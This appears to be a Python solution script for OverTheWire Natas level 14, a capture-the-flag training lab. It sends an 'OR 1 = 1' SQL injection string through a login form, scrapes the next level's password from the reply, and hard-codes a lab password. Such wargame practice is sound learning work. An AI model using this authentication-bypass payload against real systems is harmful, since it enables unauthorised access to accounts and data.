import requests
import re
from html import unescape

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/' % username

# Key is name in input tag => example <input name="uploadedfile" type="file" /><br />
# Value is tuple [0]: name of the file, [1]: open(filename,mode), [2]: mime-type
# file = {'uploadedfile':(open('info.php', 'r+'))}

with open('natas14.html', 'w+') as out:
    session = requests.Session()
    # res = session.get(url, auth=(username, password))
    
    res = session.post(url, auth=(username, password),data={'username':'"OR 1 = 1 -- ','password':''})
    flag = re.findall('The password for natas15 is (.*)<br>',res.text)[0]
    print(flag)
    out.write(unescape(res.text))
